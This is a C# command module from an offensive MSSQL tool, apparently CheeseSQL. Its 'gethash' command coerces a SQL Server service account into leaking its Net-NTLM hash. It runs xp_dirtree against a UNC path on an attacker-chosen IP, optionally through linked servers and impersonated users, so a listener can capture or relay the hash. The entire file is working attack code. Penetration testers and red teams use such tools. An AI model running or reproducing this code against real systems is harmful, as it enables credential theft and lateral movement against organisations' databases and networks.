using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class gethash : ICommand
    {
        public static string CommandName => "gethash";
        public string Description()
        {
            return $"Send Service Account Net-NTLM Hash to an Arbitrary IP";
        }

        public string Usage()
        {
            return $@"{Description()} 
Required arguments:
  /server:SERVER                   Server to connect to
  /ip:IP                           IP of the listener to capture/relay the hash

Optional arguments:
  /target:TARGET                   Specify a linked SQL server as the target
  /db:DB                           Specify an alternate database to connect 
  /impersonate:USER                Impersonate a user on the connect server
  /impersonate-intermediate:USER   Impersonate a user on the intermediate server
  /impersonate-linked:USER         Impersonate a user on the target server
  /sqlauth                         If set, use SQL authentication
    /user:SQLUSER                  If /sqlauth, set the user for SQL authentication
    /password:SQLPASSWORD          If /sqlauth, set the password for SQL authentication";
        }


        public void Execute(Dictionary<string, string> arguments)
        {
            string connectInfo = "";
            string ip = "";
            ArgumentSet argumentSet;

            try
            {
                argumentSet = ArgumentSet.FromDictionary(
                    arguments,
                    new List<string>() {
                        "/server",
                        "/ip"
                    });
            }
            catch (Exception e)
            {
                Console.WriteLine($"[x] Error: {e.Message}");
                return;
            }

            argumentSet.GetExtraString("/ip", out ip);

            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, argumentSet.connectserver, argumentSet.database, argumentSet.sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }


            string queryUNC = $"EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";";
            if (!String.IsNullOrEmpty(argumentSet.target) && !String.IsNullOrEmpty(argumentSet.intermediate))
            {
                SQLExecutor.ExecuteDoubleLinkedProcedure(
                    connection, 
                    queryUNC, 
                    argumentSet.target, 
                    argumentSet.intermediate, 
                    argumentSet.impersonate, 
                    argumentSet.impersonate_linked, 
                    argumentSet.impersonate_intermediate
                    );

            }
            else if (!String.IsNullOrEmpty(argumentSet.target))
            {
                SQLExecutor.ExecuteLinkedProcedure(
                    connection, 
                    queryUNC, 
                    argumentSet.target, 
                    argumentSet.impersonate, 
                    argumentSet.impersonate_linked
                    );
            }
            SQLExecutor.ExecuteProcedure(connection, queryUNC);

            connection.Close();
        }
    }
}
